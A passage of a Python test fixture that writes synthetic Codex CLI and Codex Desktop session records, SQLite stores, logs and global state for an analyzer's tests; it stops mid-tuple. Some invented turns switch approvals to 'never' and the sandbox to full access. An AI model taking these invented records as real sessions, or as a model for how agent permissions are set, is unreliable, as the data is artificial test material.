"""Synthetic Codex CLI state for the analyzer tests."""

from __future__ import annotations

import json
import os
import sqlite3
from pathlib import Path

from .common import PROJECT_REMOTE, _jsonl

CODEX_SESSION = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"


CODEX_SUBAGENT = "aaaaaaaa-bbbb-4ccc-8ddd-000000000002"
CODEX_FORK = "aaaaaaaa-bbbb-4ccc-8ddd-000000000003"
CODEX_LEGACY = "aaaaaaaa-bbbb-4ccc-8ddd-000000000004"
CODEX_REVERT_ROLLOUT = "aaaaaaaa-bbbb-4ccc-8ddd-000000000005"
# Synthetic ChatGPT ids of the shapes Codex Desktop writes in session_meta:
# a 36-character uuid account id and a 29-character user id.
CODEX_ACCOUNT = "11111111-2222-4333-8444-555555555555"
CODEX_USER = "user-AbCdEfGhIjKlMnOpQrStUvWx"


def codex_rollout_records(cwd="/srv/proj"):
    """Paginated shape (research/codex-cli.md, Parser plan).

    Content kinds on user messages, item_completed turn items, ordinals.
    """
    timestamp_format = "2026-10-02T09:00:0%d.000Z"
    recs = [
        {
            "timestamp": timestamp_format % 0,
            "ordinal": 0,
            "type": "session_meta",
            "payload": {
                "session_id": CODEX_SESSION,
                "id": CODEX_SESSION,
                "timestamp": timestamp_format % 0,
                "cwd": cwd,
                "originator": "codex-tui",
                "cli_version": "0.160.0",
                "source": "cli",
                "thread_source": "user",
                "model_provider": "openai",
                "history_mode": "paginated",
                "git": {
                    "commit_hash": "0a1b2c3d",
                    "branch": "feature/x",
                    "repository_url": PROJECT_REMOTE,
                },
                "creator_account_id": CODEX_ACCOUNT,
                "creator_user_id": CODEX_USER,
            },
        },
        {
            "timestamp": timestamp_format % 1,
            "ordinal": 1,
            "type": "turn_context",
            "payload": {
                "turn_id": "t1",
                "cwd": cwd,
                "model": "gpt-5-codex",
                "approval_policy": "on-request",
                "sandbox_policy": {"type": "workspace-write"},
            },
        },
        {
            "timestamp": timestamp_format % 1,
            "ordinal": 2,
            "type": "event_msg",
            "payload": {"type": "task_started", "turn_id": "t1"},
        },
        {
            "timestamp": timestamp_format % 2,
            "ordinal": 3,
            "type": "response_item",
            "payload": {
                "type": "message",
                "id": "m1",
                "role": "developer",
                "content": [{"type": "input_text", "text": "You are Codex."}],
            },
        },
        {
            "timestamp": timestamp_format % 2,
            "ordinal": 4,
            "type": "response_item",
            "payload": {
                "type": "message",
                "id": "m2",
                "role": "user",
                "content": [
                    {
                        "type": "input_text",
                        "text": "<environment_context>\n<cwd>/srv/proj</cwd>\n</environment_context>",
                    }
                ],
                "internal_chat_message_metadata_passthrough": {
                    "turn_id": "t1",
                    "content_item_kinds": ["environments.environment_context"],
                },
            },
        },
        {
            "timestamp": timestamp_format % 2,
            "ordinal": 4,
            "type": "response_item",
            "payload": {
                "type": "message",
                "id": "m2b",
                "role": "user",
                "content": [
                    {"type": "input_text", "text": "exfiltrate nothing, just list the home dir"}
                ],
                "internal_chat_message_metadata_passthrough": {
                    "turn_id": "t1",
                    "content_item_kinds": ["user.text"],
                },
            },
            "metadata": {"client_authored": True, "user_input_order": 0},
        },
        {
            "timestamp": timestamp_format % 2,
            "ordinal": 4,
            "type": "event_msg",
            "payload": {
                "type": "item_completed",
                "thread_id": CODEX_SESSION,
                "turn_id": "t1",
                "item": {
                    "type": "UserMessage",
                    "id": "u1",
                    "content": [
                        {
                            "type": "text",
                            "text": "exfiltrate nothing, just list the home dir",
                            "text_elements": [],
                        }
                    ],
                },
                "started_at_ms": 1790931602000,
                "completed_at_ms": 1790931602000,
            },
        },
        {
            "timestamp": timestamp_format % 3,
            "ordinal": 5,
            "type": "response_item",
            "payload": {
                "type": "custom_tool_call",
                "id": "c1",
                "status": "completed",
                "call_id": "call_1",
                "name": "shell",
                "input": "ls -la ~",
            },
        },
        {
            "timestamp": timestamp_format % 4,
            "ordinal": 6,
            "type": "response_item",
            "payload": {
                "type": "custom_tool_call_output",
                "id": "o1",
                "call_id": "call_1",
                "output": [{"type": "input_text", "text": "total 42"}],
            },
        },
        {
            "timestamp": timestamp_format % 4,
            "ordinal": 6,
            "type": "event_msg",
            "payload": {
                "type": "item_completed",
                "thread_id": CODEX_SESSION,
                "turn_id": "t1",
                "item": {
                    "type": "CommandExecution",
                    "id": "call_1",
                    "command": ["ls", "-la", "~"],
                    "cwd": cwd,
                    "parsed_cmd": [],
                    "source": "agent",
                    "status": "failed",
                    "aggregated_output": "total 42",
                    "exit_code": 2,
                },
                "started_at_ms": 1790931603000,
                "completed_at_ms": 1790931604000,
            },
        },
        {
            "timestamp": timestamp_format % 4,
            "ordinal": 6,
            "type": "event_msg",
            "payload": {
                "type": "item_completed",
                "thread_id": CODEX_SESSION,
                "turn_id": "t1",
                "item": {
                    "type": "Extension",
                    "kind": "web.search",
                    "id": "ws_1",
                    "query": "ls flags",
                    "action": {"type": "search", "query": "ls flags"},
                    "results": [{"title": "ls(1)"}],
                },
                "started_at_ms": 1790931603500,
                "completed_at_ms": 1790931603900,
            },
        },
        {
            "timestamp": timestamp_format % 4,
            "ordinal": 7,
            "type": "response_item",
            "payload": {
                "type": "function_call",
                "id": "c2",
                "call_id": "call_2",
                "name": "apply_patch",
                "arguments": '{"patch":"*** Begin Patch"}',
            },
        },
        {
            "timestamp": timestamp_format % 5,
            "ordinal": 8,
            "type": "response_item",
            "payload": {
                "type": "function_call_output",
                "id": "o2",
                "call_id": "call_2",
                "output": "Done",
            },
        },
        {
            "timestamp": timestamp_format % 5,
            "ordinal": 9,
            "type": "response_item",
            "payload": {
                "type": "reasoning",
                "id": "r1",
                "summary": [{"type": "summary_text", "text": "thinking"}],
                "encrypted_content": "gAAAA",
            },
        },
        {
            "timestamp": timestamp_format % 5,
            "ordinal": 9,
            "type": "response_item",
            "payload": {
                "type": "reasoning",
                "id": "r2",
                "summary": [],
                "encrypted_content": "gAAAB",
            },
        },
        {
            "timestamp": timestamp_format % 6,
            "ordinal": 10,
            "type": "response_item",
            "payload": {
                "type": "message",
                "id": "m3",
                "role": "assistant",
                "phase": "final_answer",
                "content": [{"type": "output_text", "text": "Listed the home directory."}],
            },
        },
        {
            "timestamp": timestamp_format % 7,
            "ordinal": 11,
            "type": "event_msg",
            "payload": {"type": "task_complete", "turn_id": "t1", "duration_ms": 7000},
        },
        {
            "timestamp": timestamp_format % 7,
            "ordinal": 12,
            "type": "token_usage_record",
            "payload": {"thread_id": CODEX_SESSION},
        },
        {
            # The next turn switches model and loosens every policy field.
            "timestamp": timestamp_format % 8,
            "ordinal": 13,
            "type": "turn_context",
            "payload": {
                "turn_id": "t2",
                "cwd": cwd,
                "model": "gpt-5.5-codex",
                "approval_policy": "never",
                "sandbox_policy": {"type": "danger-full-access"},
                "permission_profile": {"type": "disabled"},
                "network": {"allowed_domains": ["github.com"], "denied_domains": []},
            },
        },
    ]
    for i, record in enumerate(recs):
        record["ordinal"] = i
    return recs


# The ChatGPT desktop app's scheduled automation: the key set a Windows
# install wrote, with synthetic values. The directory is a slug of
# the name the user typed.
CODEX_AUTOMATION_REL = ".codex/automations/check-the-nightly-build/automation.toml"
CODEX_AUTOMATION_TOML = (
    """version = 1
id = "check-the-nightly-build"
kind = "heartbeat"
name = "Check the nightly build"
prompt = "Check the nightly build and \\"summarise\\" failures"
status = "ACTIVE"
rrule = "RRULE:FREQ=WEEKLY;BYHOUR=9;BYMINUTE=0;BYDAY=MO,TU,WE,TH,FR"
target_thread_id = "%s"
created_at = 1791991549000
updated_at = 1791991551000
"""
    % CODEX_SESSION
)
CODEX_AUTOMATION_MTIME = 1791991552


def build_codex_automation(home: Path) -> None:
    """Write a Codex automation and its jitter salt file.

    `.codex/automations/<slug>/automation.toml` and the directory's `.run-jitter-salt`, which the
    parser must not want.
    """
    path = home / CODEX_AUTOMATION_REL
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(CODEX_AUTOMATION_TOML, encoding="utf-8")
    os.utime(path, (CODEX_AUTOMATION_MTIME, CODEX_AUTOMATION_MTIME))
    (home / ".codex/automations/.run-jitter-salt").write_text("c2FsdA==\n", encoding="utf-8")


# Codex's SQLite projections: `state_5.sqlite` `threads` and
# `thread_history_1.sqlite` (research/codex-cli.md, Other stores, migrations at
# 3e23877). CODEX_SESSION's rows repeat the rollout fixture's events;
# CODEX_ORPHAN's rollout is gone, so only the databases hold it.
CODEX_ORPHAN = "aaaaaaaa-bbbb-4ccc-8ddd-000000000006"
CODEX_STATE_SCHEMA = """
create table threads (id text primary key, rollout_path text not null,
  created_at integer not null, updated_at integer not null, source text not null,
  model_provider text not null, cwd text not null, title text not null,
  sandbox_policy text not null, approval_mode text not null,
  tokens_used integer not null default 0, has_user_event integer not null default 0,
  archived integer not null default 0, archived_at integer, git_sha text,
  git_branch text, git_origin_url text, cli_version text not null default '',
  first_user_message text not null default '', created_at_ms integer,
  updated_at_ms integer, model text, thread_source text,
  preview text not null default '', name text);
"""
THREAD_TURNS_SCHEMA = """
create table thread_turns (thread_id text not null, turn_id text not null,
  rollout_ordinal integer not null, status text not null, error_json text,
  started_at integer, completed_at integer, duration_ms integer,
  first_user_item_id text, final_agent_item_id text, rollout_byte_offset integer,
  rollout_end_ordinal integer, rollout_end_byte_offset integer,
  primary key (thread_id, turn_id));
create table thread_history_projection_state (thread_id text primary key,
  next_rollout_byte_offset integer not null, next_rollout_ordinal integer not null);
"""
THREAD_ITEMS_SCHEMA = """
create table thread_items (thread_id text not null, turn_id text not null,
  item_id text not null, rollout_ordinal integer not null,
  created_at_ms integer not null, item_json text not null,
  item_type text not null default '', updated_at_ordinal integer not null default 0%s,
  primary key (thread_id, turn_id, item_id));
"""
# Migration 0007 adds the item lifecycle times; Open Interpreter at 2767e5f
# has no 0007.
THREAD_ITEMS_LIFECYCLE = ",\n  started_at_ms integer, completed_at_ms integer"


def codex_thread_rows(rollout_dir="/home/alice/.codex/sessions"):
    """The `threads` rows of the Codex state database.

    `threads` rows as (id, rollout_path, created_at, title, first prompt, name, archived,
    thread_source, git_branch, model).
    """
    return [
        (
            CODEX_SESSION,
            rollout_dir + "/2026/10/02/rollout-2026-10-02T09-00-00-%s.jsonl" % CODEX_SESSION,
            1790931600,
            "exfiltrate nothing, just list the home dir",
            "exfiltrate nothing, just list the home dir",
            None,
            0,
            "user",
            "feature/x",
            "gpt-5.5-codex",
        ),
        (
            CODEX_ORPHAN,
            rollout_dir + "/2026/10/01/rollout-2026-10-01T08-00-00-%s.jsonl" % CODEX_ORPHAN,
            1790841600,
            "remove the old build artifacts",
            "remove the old build artifacts",
            "cleanup",
            1,
            "user",
            None,
            "gpt-5-codex",
        ),
    ]


def write_codex_state(path: Path, threads, cwd="/srv/proj", origins=None) -> None:
    """Write a `state_5.sqlite` with one `threads` row per entry of `threads`.

    A `state_5.sqlite` with one `threads` row per entry of `threads`; `origins` maps a thread id to
    its `git_origin_url` (by default the fixture session's is `PROJECT_REMOTE`).
    """
    origins = {CODEX_SESSION: PROJECT_REMOTE} if origins is None else origins
    path.parent.mkdir(parents=True, exist_ok=True)
    connection = sqlite3.connect(str(path))
    connection.executescript(CODEX_STATE_SCHEMA)
    for thread_id, rollout, created, title, first, name, archived, source, branch, model in threads:
        connection.execute(
            "insert into threads (id, rollout_path, created_at, updated_at, source,"
            " model_provider, cwd, title, sandbox_policy, approval_mode, archived,"
            " git_branch, first_user_message, created_at_ms, updated_at_ms, model,"
            " thread_source, preview, name, git_origin_url)"
            " values (?, ?, ?, ?, 'cli', 'openai', ?, ?, '{}', 'on-request', ?, ?, ?, ?, ?,"
            " ?, ?, ?, ?, ?)",
            (
                thread_id,
                rollout,
                created,
                created + 10,
                cwd,
                title,
                archived,
                branch,
                first,
                created * 1000,
                (created + 10) * 1000,
                model,
                source,
                first,
                name,
                origins.get(thread_id),
            ),
        )
    connection.commit()
    connection.close()


def codex_thread_history():
    """(turns, items) of the projection.

    A turn is (thread, turn, ordinal, end ordinal, status, started_at s, completed_at s,
    duration_ms); an item (thread, turn, ordinal, created ms, started ms, completed ms, item). The
    CODEX_SESSION items repeat the rollout fixture's events at its times.
    """
    turns = [
        (CODEX_SESSION, "t1", 2, 16, "completed", 1790931601, 1790931607, 7000),
        (CODEX_ORPHAN, "t1", 1, 9, "completed", 1790841601, 1790841610, 9000),
    ]
    prompt = "exfiltrate nothing, just list the home dir"
    user = {
        "type": "userMessage",
        "id": "u1",
        "clientId": None,
        "content": [{"type": "text", "text": prompt, "text_elements": []}],
    }
    shell = {
        "type": "commandExecution",
        "id": "call_1",
        "command": "ls -la ~",
        "cwd": "/srv/proj",
        "processId": None,
        "source": "agent",
        "status": "failed",
        "commandActions": [],
        "aggregatedOutput": "total 42",
        "exitCode": 2,
        "durationMs": 1000,
    }
    search = {
        "type": "webSearch",
        "id": "ws_1",
        "query": "ls flags",
        "action": {"type": "search", "query": "ls flags"},
        "results": [{"title": "ls(1)"}],
    }
    thinking = {"type": "reasoning", "id": "r1", "summary": ["thinking"], "content": []}
    answer = {"type": "agentMessage", "id": "a1", "text": "Listed the home directory."}
    orphan_user = {
        "type": "userMessage",
        "id": "u9",
        "content": [{"type": "text", "text": "remove the old build artifacts"}],
    }
    orphan_patch = {
        "type": "fileChange",
        "id": "call_9",
        "changes": [{"path": "/srv/proj/build/out.o", "kind": {"type": "delete"}, "diff": ""}],
        "status": "completed",
    }
    orphan_answer = {"type": "agentMessage", "id": "a9", "text": "Removed build/."}
    compaction = {"type": "contextCompaction", "id": "cc9"}
    items = [
        (CODEX_SESSION, "t1", 6, 1790931602000, 1790931602000, 1790931602000, user),
        (CODEX_SESSION, "t1", 9, 1790931603000, 1790931603000, 1790931604000, shell),
        (CODEX_SESSION, "t1", 10, 1790931603500, 1790931603500, 1790931603900, search),
        (CODEX_SESSION, "t1", 13, 1790931604500, 1790931604500, 1790931605000, thinking),
        (CODEX_SESSION, "t1", 15, 1790931605500, 1790931605500, 1790931606000, answer),
        (CODEX_ORPHAN, "t1", 3, 1790841602000, 1790841602000, 1790841602000, orphan_user),
        (CODEX_ORPHAN, "t1", 5, 1790841603000, 1790841603000, 1790841604000, orphan_patch),
        (CODEX_ORPHAN, "t1", 7, 1790841608000, 1790841608000, 1790841609000, orphan_answer),
        (CODEX_ORPHAN, "t1", 8, 1790841609500, 1790841609500, 1790841609500, compaction),
    ]
    return turns, items


def write_thread_history(path: Path, turns, items, lifecycle: bool = True) -> None:
    """Write a `thread_history_1.sqlite`.

    A `thread_history_1.sqlite`; without `lifecycle`, in the schema before migration 0007 (no
    `started_at_ms`, `completed_at_ms`).
    """
    path.parent.mkdir(parents=True, exist_ok=True)
    connection = sqlite3.connect(str(path))
    connection.executescript(THREAD_TURNS_SCHEMA)
    connection.executescript(THREAD_ITEMS_SCHEMA % (THREAD_ITEMS_LIFECYCLE if lifecycle else ""))
    for thread, turn, ordinal, end, status, started, completed, duration in turns:
        connection.execute(
            "insert into thread_turns (thread_id, turn_id, rollout_ordinal, status,"
            " started_at, completed_at, duration_ms, rollout_end_ordinal)"
            " values (?, ?, ?, ?, ?, ?, ?, ?)",
            (thread, turn, ordinal, status, started, completed, duration, end),
        )
    for thread, turn, ordinal, created, started, completed, item in items:
        cols = "thread_id, turn_id, item_id, rollout_ordinal, created_at_ms, item_json, item_type"
        vals = [thread, turn, item["id"], ordinal, created, json.dumps(item), item["type"]]
        if lifecycle:
            cols += ", started_at_ms, completed_at_ms"
            vals += [started, completed]
        marks = ", ".join("?" * len(vals))
        connection.execute("insert into thread_items (%s) values (%s)" % (cols, marks), vals)
    connection.commit()
    connection.close()


def build_codex_stores(home: Path) -> None:
    """`.codex/state_5.sqlite`, `.codex/thread_history_1.sqlite` and `.codex/logs_2.sqlite`."""
    write_codex_state(home / ".codex/state_5.sqlite", codex_thread_rows())
    write_thread_history(home / ".codex/thread_history_1.sqlite", *codex_thread_history())
    write_codex_logs(home / ".codex/logs_2.sqlite", codex_log_rows(CODEX_SESSION))


# `logs_2.sqlite` `logs` (codex state/logs_migrations/0002 at 3e23877).
CODEX_LOGS_SCHEMA = """
CREATE TABLE logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT, ts INTEGER NOT NULL, ts_nanos INTEGER NOT NULL,
    level TEXT NOT NULL, target TEXT NOT NULL, feedback_log_body TEXT, module_path TEXT,
    file TEXT, line INTEGER, thread_id TEXT, process_uuid TEXT,
    estimated_bytes INTEGER NOT NULL DEFAULT 0
);
"""
CODEX_FEEDBACK_TIMESTAMP = 1791367200  # 7 October 10:00:00 UTC
CODEX_NO_THREAD = "no-active-thread-0199b0c0-0000-7000-8000-00000000000f"


def codex_log_rows(thread_id: str):
    """(ts, ts_nanos, level, target, feedback_log_body, thread_id) rows.

    A diagnostics line, an attachment failure under `codex_feedback` (not an upload), a sent report
    for `thread_id` with its fields in tracing's order and one with no thread open, its fields
    reordered.
    """
    return [
        (CODEX_FEEDBACK_TIMESTAMP - 5, 0, "INFO", "codex_core::codex", "turn started", thread_id),
        (
            CODEX_FEEDBACK_TIMESTAMP - 1,
            0,
            "ERROR",
            "codex_feedback",
            "feedback attachment upload failed; continuing status=500",
            thread_id,
        ),
        (
            CODEX_FEEDBACK_TIMESTAMP,
            250_000_000,
            "INFO",
            "codex_feedback",
            "feedback event uploaded to Sentry thread_id=%s uploaded_attachments=2 "
            "attachments_failed=false elapsed_ms=812" % thread_id,
            thread_id,
        ),
        (
            CODEX_FEEDBACK_TIMESTAMP + 60,
            0,
            "INFO",
            "codex_feedback",
            "feedback event uploaded to Sentry elapsed_ms=90 attachments_failed=false "
            "uploaded_attachments=0 thread_id=%s" % CODEX_NO_THREAD,
            None,
        ),
    ]


def write_codex_logs(path: Path, rows) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    connection = sqlite3.connect(str(path))
    connection.executescript(CODEX_LOGS_SCHEMA)
    connection.executemany(
        "INSERT INTO logs (ts, ts_nanos, level, target, feedback_log_body, thread_id)"
        " VALUES (?,?,?,?,?,?)",
        rows,
    )
    connection.commit()
    connection.close()


# The ChatGPT desktop app's Codex threads: key names, enum values and
# formats seen with Codex Desktop 0.163.0-alpha.10.2 inside ChatGPT
# 26.1013.40934 on macOS; every id and value is invented.
# CODEX_DESKTOP is a user thread, CODEX_GUARDIAN the guardian review thread
# the app spawned for one of its calls, CODEX_DELETED a thread deleted with
# the app's own command, whose rollout is gone and whose traces survive in
# `.codex-global-state.json`.
CODEX_DESKTOP = "0d0d0d0d-1111-4222-8333-000000000001"
CODEX_GUARDIAN = "0d0d0d0d-1111-4222-8333-000000000002"
CODEX_DELETED = "0d0d0d0d-1111-4222-8333-000000000003"
CODEX_DECLINED_ITEM = "exec-0d0d0d0d-1111-4222-8333-0000000000e1"
CODEX_REVIEWED_ITEM = "exec-0d0d0d0d-1111-4222-8333-0000000000e2"
CODEX_DESKTOP_ROLLOUT = ".codex/sessions/2026/10/18/rollout-2026-10-18T17-20-00-%s.jsonl"
CODEX_GLOBAL_STATE_REL = ".codex/.codex-global-state.json"
CODEX_GLOBAL_STATE_MTIME = 1792370000  # 19 October 00:33:20 UTC
CODEX_VERDICT = {
    "risk_level": "low",
    "user_authorization": "high",
    "outcome": "allow",
    "rationale": "The user asked for the file in that folder.",
}


def _desk(clock: str, rtype: str, payload: dict) -> dict:
    return {"timestamp": "2026-10-18T21:%s.000Z" % clock, "type": rtype, "payload": payload}


def _desk_settings(clock: str, **settings) -> dict:
    return _desk(
        clock, "event_msg", {"type": "thread_settings_applied", "thread_settings": settings}
    )


def _desk_started(clock: str, turn: str, trigger: str) -> dict:
    attribution = {
        "turn_id": turn,
        "turn_trigger": trigger,
        "parent_turn_id": None,
        "initiating_agent_path": None,
        "root_turn_id": turn,
    }
    return _desk(
        clock,
        "event_msg",
        {"type": "task_started", "turn_id": turn, "turn_attribution": attribution},
    )


WORKSPACE = {"id": ":workspace"}
MANAGED = {"type": "managed", "file_system": {"type": "restricted"}, "network": "restricted"}


def codex_desktop_records(cwd="/srv/proj"):
    """A Codex Desktop thread.

    A settings event before the first turn, a composer turn whose shell call the user declined, a
    model switch and the switch to "Approve for me" (`approvals_reviewer` `auto_review`) with no
    turn, a resume's reduced settings event that changes nothing, a turn sent from a paired phone
    whose file write a guardian review allowed, and the switch to full access after it.
    """
    return [
        _desk(
            "20:00",
            "session_meta",
            {
                "id": CODEX_DESKTOP,
                "timestamp": "2026-10-18T21:20:00.000Z",
                "cwd": cwd,
                "originator": "Codex Desktop",
                "cli_version": "0.163.0-alpha.10.2",
                "source": "vscode",
                "thread_source": "user",
                "model_provider": "openai",
                "history_mode": "paginated",
            },
        ),
        _desk_settings(
            "20:01",
            model="gpt-6.1-sol",
            approval_policy="on-request",
            approvals_reviewer="user",
            active_permission_profile=WORKSPACE,
            permission_profile=MANAGED,
            reasoning_effort="low",
        ),
        _desk_started("20:02", "t1", "composer"),
        _desk(
            "20:02",
            "turn_context",
            {
                "turn_id": "t1",
                "cwd": cwd,
                "model": "gpt-6.1-sol",
                "effort": "low",
                "approval_policy": "on-request",
                "approvals_reviewer": "user",
                "active_permission_profile": WORKSPACE,
                "permission_profile": MANAGED,
                "sandbox_policy": {"type": "workspace-write"},
            },
        ),
        _desk(
            "20:03",
            "response_item",
            {
                "type": "message",
                "role": "user",
                "content": [{"type": "input_text", "text": "fetch the example page"}],
                "internal_chat_message_metadata_passthrough": {"content_item_kinds": ["user.text"]},
            },
        ),
        _desk(
            "20:05",
            "event_msg",
            {
                "type": "item_completed",
                "thread_id": CODEX_DESKTOP,
                "turn_id": "t1",
                "item": {
                    "type": "CommandExecution",
                    "id": CODEX_DECLINED_ITEM,
                    "command": "curl https://example.com",
                    "cwd": cwd,
                    "source": "unified_exec_startup",
                    "status": "failed",
                    "aggregated_output": "rejected by user",
                    "exit_code": 1,
                },
                "started_at_ms": 1792358404000,
                "completed_at_ms": 1792358405000,
            },
        ),
        _desk(
            "20:07", "event_msg", {"type": "task_complete", "turn_id": "t1", "duration_ms": 5000}
        ),
        _desk_settings(
            "25:09",
            model="gpt-5.6-terra",
            approval_policy="on-request",
            approvals_reviewer="user",
            active_permission_profile=WORKSPACE,
            permission_profile=MANAGED,
        ),
        _desk_settings(
            "25:28",
            model="gpt-5.6-terra",
            approval_policy="on-request",
            approvals_reviewer="auto_review",
            active_permission_profile=WORKSPACE,
            permission_profile=MANAGED,
        ),
        # A resume's reduced key set: no active_permission_profile.
        _desk_settings(
            "26:40",
            model="gpt-5.6-terra",
            approval_policy="on-request",
            approvals_reviewer="auto_review",
            permission_profile=MANAGED,
        ),
        _desk_started("26:41", "t2", "remote_ios"),
        _desk(
            "26:41",
            "turn_context",
            {
                "turn_id": "t2",
                "cwd": cwd,
                "model": "gpt-5.6-terra",
                "approval_policy": "on-request",
                "approvals_reviewer": "auto_review",
                "active_permission_profile": WORKSPACE,
                "permission_profile": MANAGED,
                "sandbox_policy": {"type": "workspace-write"},
            },
        ),
        _desk(
            "27:27",
            "event_msg",
            {
                "type": "item_completed",
                "thread_id": CODEX_DESKTOP,
                "turn_id": "t2",
                "item": {
                    "type": "FileChange",
                    "id": CODEX_REVIEWED_ITEM,
                    "changes": {"/home/alice/Documents/guide.md": {"type": "add"}},
                    "status": "completed",
                },
                "started_at_ms": 1792358847000,
                "completed_at_ms": 1792358847600,
            },
        ),
        _desk(
            "27:32", "event_msg", {"type": "task_complete", "turn_id": "t2", "duration_ms": 51000}
        ),
        _desk_settings(
            "52:30",
            model="gpt-5.6-terra",
            approval_policy="never",
            approvals_reviewer="user",
            active_permission_profile={"id": ":danger-full-access"},
            permission_profile={"type": "disabled"},
        ),
    ]


def codex_guardian_records(cwd="/srv/proj"):
    """The guardian review thread of CODEX_DESKTOP's file write.

    Its verdict is the JSON text of the final agent message.
    """
    verdict = json.dumps(CODEX_VERDICT)
    return [
        _desk(
            "27:23",
            "session_meta",
            {
                "id": CODEX_GUARDIAN,
                "timestamp": "2026-10-18T21:27:23.000Z",
                "cwd": cwd,
                "originator": "Codex Desktop",
                "cli_version": "0.163.0-alpha.10.2",
                "source": {"subagent": {"other": "guardian"}},
                "thread_source": "guardian_review",
                "parent_thread_id": CODEX_DESKTOP,
                "multi_agent_version": "disabled",
                "model_provider": "openai",
            },
        ),
        _desk_started("27:23", "tg", "guardian_review"),
        _desk(
            "27:23",
            "turn_context",
            {
                "turn_id": "tg",
                "cwd": cwd,
                "model": "codex-auto-review",
                "approval_policy": "never",
                "approvals_reviewer": "auto_review",
                "sandbox_policy": {"type": "read-only"},
            },
        ),
        _desk(
            "27:26",
            "response_item",
            {
                "type": "message",
                "role": "assistant",
                "content": [{"type": "output_text", "text": verdict}],
            },
        ),
        _desk(
            "27:27",
            "event_msg",
            {
                "type": "task_complete",
                "turn_id": "tg",
                "duration_ms": 4000,
                "last_agent_message": verdict,
            },
        ),
    ]


def codex_desktop_log_rows():
    """`logs_2.sqlite` rows (ts, ts_nanos, level, target, body, thread_id) of the desktop app.

    The core's record of the user's decline and the app server's response that repeats it, a
    response with no core record beside it, and a model-manager line inside the guardian review
    span.
    """
    return [
        (
            1792358405,
            0,
            "DEBUG",
            "codex_core::session::handlers",
            "Submission thread_id=%s submission_id=0d0d0d0d-1111-4222-8333-0000000000f1 "
            'operation="exec_approval" op=ExecApproval { id: "%s", turn_id: Some("t1"), '
            "decision: denied }" % (CODEX_DESKTOP, CODEX_DECLINED_ITEM),
            CODEX_DESKTOP,
        ),
        (
            1792358405,
            0,
            "INFO",
            "codex_app_server::outgoing_message",
            "<- response: CommandExecutionRequestApproval { request_id: Integer(9), response: "
            "CommandExecutionRequestApprovalResponse { decision: Decline } }",
            None,
        ),
        (
            1792358843,
            0,
            "DEBUG",
            "codex_models_manager::manager",
            'guardian_review{review_id="0d0d0d0d-1111-4222-8333-0000000000f2" thread_id=%s '
            'tool_call_id="%s"}: models cache hit' % (CODEX_DESKTOP, CODEX_REVIEWED_ITEM),
            None,
        ),
        (
            1792359000,
            0,
            "INFO",
            "codex_app_server::outgoing_message",
            "<- response: CommandExecutionRequestApproval { request_id: Integer(11), response: "
            "CommandExecutionRequestApprovalResponse { decision: Accept } }",
            None,
        ),
    ]


def codex_global_state(cwd="/srv/proj"):
    """`.codex-global-state.json`.

    The persisted atoms hold the prompt history (a `global` list and one per thread, CODEX_DELETED's
    too), a description and an activity time for CODEX_DELETED and its deletion marker,
    CODEX_DESKTOP's standing permissions and the host's agent mode; the top level the deleted
    thread's output directory and the remote control flags.
    """

    def prompt(text):
        para = {"type": "paragraph", "content": [{"type": "text", "text": text}]}
        return {"markdown": text, "document": {"type": "doc", "content": [para]}}

    scratch = "/home/alice/Documents/Codex/2026-10-18/w"
    atom = {
        "prompt-history": {
            "global": [prompt("fetch the example page"), prompt("what is the capital of the UK")],
            CODEX_DESKTOP: [prompt("fetch the example page")],
            CODEX_DELETED: [prompt("what is the capital of the UK")],
        },
        "thread-descriptions-v1": {CODEX_DELETED: "Find the UK capital"},
        "thread-user-activity-times-v1": {'["local","%s"]' % CODEX_DELETED: 1792330834000},
        "heartbeat-thread-permissions-by-id": {
            CODEX_DESKTOP: {
                "activePermissionProfile": {"id": ":workspace", "extends": None},
                "approvalPolicy": "on-request",
                "approvalsReviewer": "auto_review",
                "sandboxPolicy": {
                    "type": "workspaceWrite",
                    "writableRoots": [cwd],
                    "networkAccess": False,
                    "excludeTmpdirEnvVar": False,
                    "excludeSlashTmp": False,
                },
            }
        },
        "codex-writing-block-deleted-thread-v1:%s" % CODEX_DELETED: True,
        "agent-mode-by-host-id": {"local": "guardian-approvals"},
        "permission-selection-by-host-id:local": {
            "kind": "agent-mode",
            "agentMode": "guardian-approvals",
        },
        "composer-recent-model-configurations-v1": [
            {"model": "gpt-5.6-terra", "reasoningEffort": "low", "serviceTier": None}
        ],
    }
    return {
        "electron-persisted-atom-state": atom,
        "projectless-thread-ids": [CODEX_DELETED],
        "thread-projectless-output-directories": {CODEX_DELETED: scratch},
        "thread-workspace-root-hints": {CODEX_DELETED: scratch},
        "electron-local-remote-control-environment-id": "env_e_0123abcd",
        "codex-mobile-has-connected-device": True,
    }


def build_codex_desktop(home: Path) -> None:
    """Write the ChatGPT desktop app's Codex threads, log rows and global state.

    The desktop app's thread and guardian rollouts, its approval and guardian log rows added to
    `.codex/logs_2.sqlite` (which `build_codex_stores` writes first) and `.codex-global-state.json`.
    """
    for session_id, records in (
        (CODEX_DESKTOP, codex_desktop_records()),
        (CODEX_GUARDIAN, codex_guardian_records()),
    ):
        _jsonl(home / (CODEX_DESKTOP_ROLLOUT % session_id), records)
    connection = sqlite3.connect(str(home / ".codex/logs_2.sqlite"))
    connection.executemany(
        "INSERT INTO logs (ts, ts_nanos, level, target, feedback_log_body, thread_id)"
        " VALUES (?,?,?,?,?,?)",
        codex_desktop_log_rows(),
    )
    connection.commit()
    connection.close()
    path = home / CODEX_GLOBAL_STATE_REL
    path.write_text(json.dumps(codex_global_state()), encoding="utf-8")
    os.utime(path, (CODEX_GLOBAL_STATE_MTIME, CODEX_GLOBAL_STATE_MTIME))


# `state_5.sqlite` `remote_control_enrollments` (codex
# state/migrations/0024 and 0037 at 3e23877; ids invented).
CODEX_ENROLLMENT_SCHEMA = """
create table remote_control_enrollments (websocket_url text not null,
  account_id text not null, app_server_client_name text, server_id text not null,
  environment_id text not null, server_name text not null, updated_at integer not null,
  remote_control_enabled integer not null default 1);
"""


def write_codex_enrollment(path: Path, enabled: int = 1) -> None:
    connection = sqlite3.connect(str(path))
    connection.executescript(CODEX_ENROLLMENT_SCHEMA)
    connection.execute(
        "insert into remote_control_enrollments values (?, ?, ?, ?, ?, ?, ?, ?)",
        (
            "wss://chatgpt.com/backend-api/wham/remote/control/server",
            CODEX_ACCOUNT,
            "Codex Desktop",
            "srv_e_0123abcd",
            "env_e_0123abcd",
